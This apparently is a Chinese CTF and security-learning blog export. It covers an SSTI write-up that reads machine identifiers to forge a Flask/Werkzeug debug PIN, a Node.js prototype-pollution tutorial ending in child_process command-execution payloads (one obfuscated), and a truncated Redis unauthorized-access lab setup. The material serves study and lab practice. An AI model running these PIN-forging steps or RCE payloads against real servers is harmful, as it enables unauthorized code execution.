class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<p>去复习把o(╥﹏╥)o,踩了很多坑,终于复现成功了，因为都差不多就写一个wp啦</p>
<p>buuctf [GYCTF2020]FlaskApp </p>
<p>nssctf [NISACTF 2022]is secret</p>
<h3 id="nssctf-NISACTF-2022-is-secret"><a href="#nssctf-NISACTF-2022-is-secret" class="headerlink" title="nssctf [NISACTF 2022]is secret"></a>nssctf [NISACTF 2022]is secret</h3><p>进入页面发现Welcome To Find Secret</p>
<p>一开始并没有想到secret路径</p>
<p>发现在robots.txt有一句It is Android ctf,这是骗你了</p>
<p>在主页面提示下进入secret路径</p>
<p><code>http://node2.anna.nssctf.cn:28203/secret</code>页面显示Tell me your secret.I will encrypt it so others can’t see</p>
<p>提示传参,get传参secret&#x3D;1,发现返回d,因为题目提示了ssti此时尝试多输入后发现</p>
<p><img src="/images/image-20230604172157035.png" alt="image-20230604172157035"></p>
<p>此时发现是rc4加密,我们要利用的是render_template_string才能模板注入，所以要rc4解密后的字符串来ssti</p>
<p><code>https://cyberchef.org/</code>在线解码咯</p>
<p><img src="/images/image-20230604172556899.png" alt="image-20230604172556899"></p>
<p>来读取machine-id读机器id一部分</p>
<p>为edd27189d58e4ab95266cf4c78d75541c29cd68c98c2d1afa8a24a778e748940</p>
<p><img src="/images/image-20230604172751083.png" alt="image-20230604172751083"></p>
<p>因为之前说过了需要&#x2F;docker&#x2F;后的字符串</p>
<p>然后在读取&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id,原因上面都有了直接写了</p>
<p>e0ad2d31-1d21-4f57-b1c5-4a9036fbf235</p>
<p>所以机器id 是e0ad2d31-1d21-4f57-b1c5-4a9036fbf235edd27189d58e4ab95266cf4c78d75541c29cd68c98c2d1afa8a24a778e748940</p>
<p>同理读mac地址和username：02:42:ac:02:b9:a8  glzjin</p>
<p>mac改为10进制后</p>
<p>print(int(‘0242ac02b9a8 ‘,16))  	2485376956840</p>
<p>所以根据脚本，&#x3D;w&#x3D;这我就写最关键的啦</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;glzjin&#x27;</span><span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python2.7/site-packages/flask/app.pyc&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485376956840&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;e0ad2d31-1d21-4f57-b1c5-4a9036fbf235edd27189d58e4ab95266cf4c78d75541c29cd68c98c2d1afa8a24a778e748940&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>pin为340-400-321</p>
<p>然后在console路径输入pin码就能执行命令啦</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>node.js原型链污染</title>
    <url>/2023/06/30/node%E5%8E%9F%E5%9E%8B%E9%93%BE/</url>
    <content><![CDATA[<h2 id="NodeJS基础"><a href="#NodeJS基础" class="headerlink" title="NodeJS基础"></a>NodeJS基础</h2><blockquote>
<p>Node.js 是一个基于 Chrome V8 引擎的 Javascript 运行环境</p>
</blockquote>
<p>但是它是由C++开发的，它只是一个JavaScript语言解释器。<br>REPL环境运行JavaScript的代码</p>
<p>在浏览器的控制台或者node的运行环境都属于REPL运行环境，均可以运行JS代码。<br>在NodeJS中分为三个模块，分别是：核心模块、自定义模块、第三方模块。<br>这里提一点，JS代码在编程时，如果需要使用某个模块的功能，那么就需要提前将其导入，与Python类似，只不过在Python中使用import关键字，而JS中使用require关键字。</p>
<h3 id="读取文件操作"><a href="#读取文件操作" class="headerlink" title="读取文件操作"></a>读取文件操作</h3><p>文件系统模块就是核心模块</p>
<p><img src="https://p0.ssl.qhimg.com/t01b5e80630c79ab038.png" alt="img"></p>
<h3 id="同步和异步"><a href="#同步和异步" class="headerlink" title="同步和异步"></a>同步和异步</h3><p>区别：</p>
<blockquote>
<p>同步方法： 等待每个操作完成，然后只执行下一个操作<br>异步方式： 从不等待每个操作完成，而是只在第一步执行所有操作</p>
</blockquote>
<p>看到一个比较有趣的描述：</p>
<blockquote>
<p>同步： 可以拿吃饭和看电视来举例子，同步就是先吃完饭，吃完饭后再看电视，不能边看边吃，这就是同步<br>异步： 同样拿上边的例子来说，异步就是边吃饭边看电视，看电视和吃饭同时进行，这样举例就应该很清楚了</p>
</blockquote>
<p>readFile()是异步操作</p>
<h3 id="HTTP服务"><a href="#HTTP服务" class="headerlink" title="HTTP服务"></a>HTTP服务</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="comment">//引入http核心模块</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="comment">//创建一个服务</span></span><br><span class="line"><span class="keyword">var</span> server = http.<span class="title function_">createServer</span>();</span><br><span class="line"><span class="comment">//绑定连接</span></span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;request&#x27;</span>,<span class="keyword">function</span>(<span class="params">res,rs</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">method</span>);<span class="comment">//打印请求的方法</span></span><br><span class="line">    rs.<span class="title function_">write</span>(<span class="string">&#x27;hello,world!&#x27;</span>);<span class="comment">//返回数据</span></span><br><span class="line">    rs.<span class="title function_">end</span>();<span class="comment">//断开连接</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//启动监听</span></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">4444</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;请访问127.0.0.1:4444&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><ol>
<li>__dirname：当前模块的目录名。</li>
<li>__filename：当前模块的文件名。 这是当前的模块文件的绝对路径（符号链接会被解析）。</li>
<li>exports变量是默认赋值给<code>module.exports</code>，它可以被赋予新值，它会暂时不会绑定到module.exports。</li>
<li>module：在每个模块中， <code>module</code> 的自由变量是对表示当前模块的对象的引用。 为方便起见，还可以通过全局模块的 <code>exports</code> 访问 <code>module.exports</code>。 module 实际上不是全局的，而是每个模块本地的</li>
<li>require模块就不多说了，用于引入模块、 JSON、或本地文件。 可以从 node_modules 引入模块。</li>
</ol>
<h3 id="child-process-创建子进程"><a href="#child-process-创建子进程" class="headerlink" title="child_process(创建子进程)"></a>child_process(创建子进程)</h3><p>child_process提供了几种创建子进程的方式</p>
<blockquote>
<p>异步方式：spawn、exec、execFile、fork<br>同步方式：spawnSync、execSync、execFileSync</p>
</blockquote>
<p>经过上面的同步和异步思想的理解，创建子进程的同步异步方式应该不难理解。<br>在异步创建进程时，spawn是基础，其他的fork、exec、execFile都是基于spawn来生成的。<br>同步创建进程可以使用<code>child_process.spawnSync()</code>、<code>child_process.execSync()</code> 和 <code>child_process.execFileSync()</code> ，同步的方法会阻塞 Node.js 事件循环、暂停任何其他代码的执行，直到子进程退出。</p>
<p><a href="https://www.anquanke.com/post/id/236182">https://www.anquanke.com/post/id/236182</a></p>
<h1 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h1><p>我们创建的每个函数都有一个 prototype（原型）属性，这个属性是一个指针，指向一个对象，</p>
<p>而这个对象的用途是包含可以由特定类型的所有实例共享的属性和方法</p>
<p>设计原型的初衷无非是对于每个实例对象，其拥有的共同属性没必要对每个对象实例再分配一片内存来存放这个属性。而可以上升到所有对象共享这个属性，而这个属性的实体在内存中也仅仅只有一份。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="keyword">function</span> <span class="title function_">F</span>(<span class="params"></span>)&#123;...&#125;</span><br><span class="line"><span class="number">2.</span> <span class="keyword">var</span> f = <span class="keyword">new</span> <span class="title function_">F</span>();</span><br><span class="line">分析：</span><br><span class="line"><span class="number">1.</span>创建一个func F，同时创立了一个F对象（该对象默认是接着<span class="title class_">Object</span>的原型链，可以理解为<span class="title class_">Object</span>的实例对象），并将F的构造器指向了<span class="keyword">function</span> <span class="title function_">F</span>(<span class="params"></span>)，同时设置内部属性prototype指向了对象F本身。</span><br><span class="line"><span class="number">2.</span> 当对对象F或叫函数F进行实例化时，会创建 一个实例对象,同时该实例对象默认加一个__proto__属性，指向F对象。</span><br></pre></td></tr></table></figure>

<p><img src="https://pic4.zhimg.com/80/v2-ef4fc78b77be9cc2e6b9b5a0ca6e3f43_720w.webp" alt="img"></p>
<p>在c++或java这些面向对象的语言中，我们如果想要一个对象，首先需要使用关键字class声明一个类，再使用关键字new一个对象出来，但是在JavaScript中没有class以及类这种概念（为了简化编写JavaScript代码，ECMAScript 6后增加了<code>class</code>语法，但<code>class</code>其实只是一个语法糖）。 在JavaScript有这么两种声明对象的方式，为了好理解我们先引入类的思想。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">person=<span class="keyword">new</span> <span class="title class_">Object</span>()</span><br><span class="line">person.<span class="property">firstname</span>=<span class="string">&quot;John&quot;</span>;</span><br><span class="line">person.<span class="property">lastname</span>=<span class="string">&quot;Doe&quot;</span>;</span><br><span class="line">person.<span class="property">age</span>=<span class="number">50</span>;</span><br><span class="line">person.<span class="property">eyecolor</span>=<span class="string">&quot;blue&quot;</span>;</span><br><span class="line"></span><br><span class="line">这种创建对象的方法还有另一种写法 如下</span><br><span class="line">person=&#123;<span class="attr">firstname</span>:<span class="string">&quot;John&quot;</span>,<span class="attr">lastname</span>:<span class="string">&quot;Doe&quot;</span>,<span class="attr">age</span>:<span class="number">50</span>,<span class="attr">eyecolor</span>:<span class="string">&quot;blue&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">这种方法通过直接实例化构造方法<span class="title class_">Object</span>()来创建对象</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">person</span>(<span class="params">firstname,lastname,age,eyecolor</span>)  这里创建了一个“类” 但是在<span class="title class_">JavaScript</span>中叫做构造函数或者构造器</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">firstname</span>=firstname;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">lastname</span>=lastname;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span>=age;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">eyecolor</span>=eyecolor;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> myFather=<span class="keyword">new</span> <span class="title function_">person</span>(<span class="string">&quot;John&quot;</span>,<span class="string">&quot;Doe&quot;</span>,<span class="number">50</span>,<span class="string">&quot;blue&quot;</span>);    通过这个“类”实例化对象</span><br><span class="line"><span class="keyword">var</span> myMother=<span class="keyword">new</span> <span class="title function_">person</span>(<span class="string">&quot;Sally&quot;</span>,<span class="string">&quot;Rally&quot;</span>,<span class="number">48</span>,<span class="string">&quot;green&quot;</span>);</span><br><span class="line"></span><br><span class="line">这种方法先创建构造函数 再实例化构造函数 构造函数<span class="keyword">function</span>也属于<span class="title class_">Object</span> 如果对这里为什么属于<span class="title class_">Object</span>而不属于<span class="title class_">Function</span>有疑问请继续阅读 下面会解释</span><br></pre></td></tr></table></figure>

<p>既然是通过实例化Object来创建对象或创建构造函数，在JavaScript中有两个很特殊的对象，Function() 和 Object() ，它们两个既是构造函数也是对象，作为对象是不是应该有一个“类”去作为他们的模板呢？</p>
<p>对于Object()来说，要声明这么一个构造函数我们可以使用关键字function来创建 。（在底层 使用function创建一个函数 其实就相当于这个过程）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Object</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">在底层为</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Object</span> = <span class="keyword">new</span> <span class="title class_">Function</span>();</span><br></pre></td></tr></table></figure>

<p>那么对于Function自己这个对象，他是怎么来的呢？如果用Function.<code>__proto__</code>和Function.prototype进行比较，发现二者是全等的，所以Function创造了自己，也创造了Object，所以JavaScript中，所有函数都是对象，而对象是通过函数创建的。因此<code>构造函数.prototype.__proto__</code>应该是Object.prototype，而不是Function.prototype，Function的作用是创建而不是继承。</p>
<p><code>__proto__</code>是任何一个对象拥有的属性</p>
<p><code>prototype</code>是任何一个函数拥有的一个属性</p>
<h1 id="原型链继承机制"><a href="#原型链继承机制" class="headerlink" title="原型链继承机制"></a>原型链继承机制</h1><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)</a></p>
<p>还得看p神</p>
<p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure>

<p>Son类继承了Father类的<code>last_name</code>属性，最后输出的是<code>Name: Melania Trump</code>。</p>
<p>总结一下，对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p>
<ol>
<li>在对象son中寻找last_name</li>
<li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li>
<li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li>
<li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li>
</ol>
<p><img src="https://www.leavesongs.com/media/attachment/2019/04/03/08c5d5d0-62da-40f9-9e2c-77831fa7488e.51324dd04eef.png" alt="image.png"></p>
<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><p><code>foo.__proto__</code>指向的是<code>Foo</code>类的<code>prototype</code>。那么，如果我们修改了<code>foo.__proto__</code>中的值，是不是就可以修改Foo类呢？</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>)</span><br></pre></td></tr></table></figure>

<p>最后，虽然zoo是一个<strong>空</strong>对象<code>&#123;&#125;</code>，但<code>zoo.bar</code>的结果居然是2：</p>
<p>原因也显而易见：因为前面我们修改了foo的原型<code>foo.__proto__.bar = 2</code>，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。</p>
<p>后来，我们又用Object类创建了一个zoo对象<code>let zoo = &#123;&#125;</code>，zoo对象自然也有一个bar属性了。</p>
<p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>
<h1 id="哪些情况会被污染"><a href="#哪些情况会被污染" class="headerlink" title="哪些情况会被污染"></a>哪些情况会被污染</h1><p>在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？</p>
<p>我们思考一下，哪些情况下我们可以设置<code>__proto__</code>的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：</p>
<ul>
<li>对象merge</li>
<li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li>
</ul>
<p>以对象merge为例，我们想象一个简单的merge函数：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在合并的过程中，存在赋值的操作<code>target[key] = source[key]</code>，那么，这个key如果是<code>__proto__</code>，是不是就可以原型链污染呢？</p>
<p>我们用如下代码实验一下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br></pre></td></tr></table></figure>

<p>结果是，合并虽然成功了，但原型链没有被污染：</p>
<p><img src="https://www.leavesongs.com/media/attachment/2019/04/03/ba16d965-3112-4f69-bf5e-4eddb034e6dc.c5e82ea6e4f5.png" alt="image.png"></p>
<p>这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p>
<p>如何让<code>__proto__</code>被认为是一个键名呢？</p>
<p>我们将代码改成如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br></pre></td></tr></table></figure>

<p>可见，新建的o3对象，也存在b属性，说明Object已经被污染：</p>
<p><img src="https://www.leavesongs.com/media/attachment/2019/04/03/5e05a46f-3c7b-4ab4-869c-fe6fd19422b7.64db1b9bbae7.png" alt="image.png"></p>
<p>这是因为，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p>
<p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。</p>
<p>通过题[GYCTF2020]Ez_Express来加深理解</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>( “child_process” ).<span class="title function_">spawnSync</span>( ‘ls’, [ ‘/‘ ] ).<span class="property">stdout</span>.<span class="title function_">toString</span>()</span><br><span class="line"><span class="built_in">require</span>( “child_process” ).<span class="title function_">spawnSync</span>( ‘cat’, [ ‘f*’ ] ).<span class="property">stdout</span>.<span class="title function_">toString</span>()</span><br><span class="line"><span class="built_in">require</span>( “child_process” ).<span class="title function_">execSync</span>(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(‘child_process’).<span class="title function_">exec</span>(‘calc’)</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>).<span class="title function_">readFileSync</span>(<span class="string">&#x27;/app/routes/index.js&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&#x27;exe&#x27;</span>%2B<span class="string">&#x27;cSync&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>redis未授权访问漏洞复现</title>
    <url>/2023/06/11/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h1><p>Redis安装后，默认情况下，会绑定在 <code>0.0.0.0:6379</code>，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的<code>config</code> 命令，可以进行写文件操作，攻击者可以成功将自己的<code>ssh公钥</code>写入目标服务器的 <code>/root/.ssh</code> 文件夹的<code>authotrized_keys</code>文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
<p>(在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错)</p>
<p>漏洞的产生条件有以下两点:</p>
<p>(1)  Redis绑定在0.0.0.0:6379,且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网</p>
<p>(2)  没有设置密码认证（默认为空）或者弱密码，可以免密码登录redis服务</p>
<p><strong>漏洞影响版本</strong></p>
<p>Redis 2.x，3.x，4.x，5.x</p>
<p><strong>漏洞危害</strong></p>
<p>(1) 攻击者无需认证访问到内部数据,可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据</p>
<p>(2) 攻击者可通过eval执行lua代码，或通过数据备份功能往磁盘写入后门文件</p>
<p>(3) 如果redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器 </p>
<h1 id="攻击复现"><a href="#攻击复现" class="headerlink" title="攻击复现"></a>攻击复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>攻击机: kali 2023.1</p>
<p>靶机: ubuntu 22.04.2</p>
<p>靶机安装redis服务器(redis-server)</p>
<ol>
<li><p>下载redis-4.0.10</p>
<p><code>wget http://download.redis.io/releases/redis-4.0.10.tar.gz</code></p>
</li>
<li><p>解压，进入源码目录，然后编译(make、make install)</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">tar</span> -zxf redis-<span class="number">4</span>.<span class="number">0</span>.<span class="number">10</span>.tar.gz</span><br><span class="line"><span class="attribute">cd</span> redis-<span class="number">4</span>.<span class="number">0</span>.<span class="number">10</span></span><br><span class="line"><span class="attribute">make</span></span><br><span class="line"><span class="attribute">make</span> install</span><br></pre></td></tr></table></figure>

<p>我这里make出现了错误,缺少gcc</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> src &amp;&amp; <span class="keyword">make</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">make</span>[<span class="number">1</span>]: Entering directory <span class="string">&#x27;/home/ubuntu/redis-4.0.11/src&#x27;</span></span><br><span class="line">    CC adlist.<span class="keyword">o</span></span><br><span class="line">/bin/<span class="keyword">sh</span>: <span class="number">1</span>: <span class="keyword">cc</span>: not found</span><br><span class="line">Makefile:<span class="number">228</span>: recipe <span class="keyword">for</span> target <span class="string">&#x27;adlist.o&#x27;</span> failed</span><br><span class="line"><span class="keyword">make</span>[<span class="number">1</span>]: *** [adlist.<span class="keyword">o</span>] Error <span class="number">127</span></span><br><span class="line"><span class="keyword">make</span>[<span class="number">1</span>]: Leaving directory <span class="string">&#x27;/home/ubuntu/redis-4.0.11/src&#x27;</span></span><br><span class="line">Makefile:<span class="number">6</span>: recipe <span class="keyword">for</span> target <span class="string">&#x27;all&#x27;</span> failed</span><br><span class="line"><span class="keyword">make</span>: *** [<span class="keyword">all</span>] Error <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>apt install gcc</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> src &amp;&amp; <span class="keyword">make</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">make</span>[<span class="number">1</span>]: Entering directory <span class="string">&#x27;/home/ubuntu/redis-4.0.11/src&#x27;</span></span><br><span class="line">    CC adlist.<span class="keyword">o</span></span><br><span class="line">In <span class="keyword">file</span> included from adlist.<span class="keyword">c</span>:<span class="number">34</span>:<span class="number">0</span>:</span><br><span class="line">zmalloc.h:<span class="number">50</span>:<span class="number">10</span>: fatal error: jemalloc/jemalloc.h: No such <span class="keyword">file</span> <span class="built_in">or</span> directory</span><br><span class="line"> #include &lt;jemalloc/jemalloc.h&gt;</span><br><span class="line">          ^~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">compilation terminated.</span><br><span class="line">Makefile:<span class="number">228</span>: recipe <span class="keyword">for</span> target <span class="string">&#x27;adlist.o&#x27;</span> failed</span><br><span class="line"><span class="keyword">make</span>[<span class="number">1</span>]: *** [adlist.<span class="keyword">o</span>] Error <span class="number">1</span></span><br><span class="line"><span class="keyword">make</span>[<span class="number">1</span>]: Leaving directory <span class="string">&#x27;/home/ubuntu/redis-4.0.11/src&#x27;</span></span><br></pre></td></tr></table></figure>

<p>可以通过 mkae MALLOC&#x3D;libc</p>
<p>需要修改配置文件redis.conf</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">bind</span> <span class="number">0.0.0.0</span></span><br><span class="line">protected-mode <span class="literal">no</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>启动服务(redis-server)<br>启动redis服务，注意关闭防火墙，Ubuntu除了iptables机制，还有ufw安全机制</p>
<p><code>ufw staus</code>看是否关闭<br>启动服务</p>
